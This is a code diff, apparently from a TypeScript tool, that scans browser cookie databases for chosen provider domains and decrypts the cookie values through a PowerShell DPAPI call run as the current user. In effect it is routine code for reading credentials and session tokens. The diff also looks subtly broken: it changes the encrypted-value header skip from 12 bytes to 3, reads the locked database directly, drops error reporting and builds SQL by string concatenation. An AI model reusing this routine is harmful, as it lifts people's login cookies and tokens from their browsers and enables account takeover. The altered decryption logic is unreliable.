@@ -60,32 +60,15 @@ function decryptChromeValue(encryptedValue: Buffer): string {
   if (!encryptedValue || encryptedValue.length === 0) return "";
   const prefix = encryptedValue.toString("utf-8", 0, 3);
   if (prefix === "v10" || prefix === "v11") {
-    const ciphertext = encryptedValue.slice(12); // Skip v10/v11 header (12 bytes)
+    const ciphertext = encryptedValue.slice(prefix.length);
     const b64 = ciphertext.toString("base64");
-    // Use spawn for better error handling
-    const psScript = `
-try {
-  Add-Type -AssemblyName System.Security
-  $c = [Convert]::FromBase64String('${b64}')
-  $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, 'CurrentUser')
-  Write-Output ([Convert]::ToBase64String($d))
-} catch {
-  Write-Error $_.Exception.Message
-  exit 1
-}`;
+    const psScript = `Add-Type -AssemblyName System.Security;$c=[Convert]::FromBase64String('${b64}');$d=[System.Security.Cryptography.ProtectedData]::Unprotect($c,$null,'CurrentUser');[Convert]::ToBase64String($d)`;
     try {
-      const result = execSync(`powershell -NoProfile -NonInteractive -Command "${psScript.replace(/"/g, '\\"').replace(/\n/g, ' ')}"`, {
-        encoding: "utf-8", timeout: 8000, windowsHide: true, stdio: ["pipe", "pipe", "pipe"],
+      const result = execSync(`powershell -NoProfile -NonInteractive -Command "${psScript}"`, {
+        encoding: "utf-8", timeout: 5000, windowsHide: true,
       });
-      const lines = result.trim().split("\n");
-      const lastLine = lines[lines.length - 1].trim();
-      if (lastLine && lastLine.length > 10) {
-        return Buffer.from(lastLine, "base64").toString("utf-8");
-      }
-    } catch (e: any) {
-      console.error("[TokenDecrypt] PowerShell DPAPI failed:", e.message?.slice(0, 100));
-    }
-    throw new Error("DPAPI decrypt failed");
+      return Buffer.from(result.trim(), "base64").toString("utf-8");
+    } catch { throw new Error("DPAPI decrypt failed"); }
   }
   return encryptedValue.toString("utf-8");
 }
@@ -94,12 +77,7 @@ try {
 function scanCookies(dbPath: string, browser: string, providerDomains: string[], providerName: string): TokenResult[] {
   try {
     const Database = require("better-sqlite3");
-    // Copy DB to temp to bypass browser lock
-    const tmpPath = join(os.tmpdir(), `clawhub_cookies_${Date.now()}.db`);
-    try { require("fs").copyFileSync(dbPath, tmpPath); } catch (e: any) {
-      return [{ browser, domain: "", name: "", value: "", decrypted: false, error: `Cannot access cookies. ${e.message}. Close ${browser} first.` }];
-    }
-    const db = new Database(tmpPath, { readonly: true });
+    const db = new Database(dbPath, { readonly: true });
     const domains = providerDomains.map(d => `'${d}'`).join(",");
     const rows = db.prepare(`SELECT host_key, name, encrypted_value FROM cookies WHERE host_key IN (${domains})`).all();
     const results: TokenResult[] = [];
@@ -111,7 +89,6 @@ function scanCookies(dbPath: string, browser: string, providerDomains: string[],
       }
     }
     db.close();
-    try { require("fs").unlinkSync(tmpPath); } catch {}
     return results;
   } catch (e: any) {
     return [{ browser, domain: "", name: "", value: "", decrypted: false, error: e.message }];
